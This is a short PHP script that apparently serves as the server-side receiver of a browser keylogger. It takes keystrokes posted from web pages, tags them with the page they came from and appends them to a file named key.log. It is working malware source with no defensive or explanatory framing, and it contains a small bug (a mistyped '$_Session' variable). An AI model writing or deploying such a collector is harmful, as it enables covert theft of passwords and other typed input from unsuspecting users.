<?php
session_start();

if (!isset($_POST['key'])) {
    echo("Access Denied");
    exit(0);
}

# Open log for keys to record
$file = fopen("key.log", "a+");

# Keep track of the page and when it changes
if (!isset($_SESSION['page']) || $_Session['page'] != $_POST['page']) {
    $_SESSION['page'] = $_POST['page'];
    fwrite($file," [[[ PAGE: ".$_POST['page']."]]] ");
}

# Append to log
fwrite($file, $_POST['key']);
fclose($file);;

echo('Char saved!');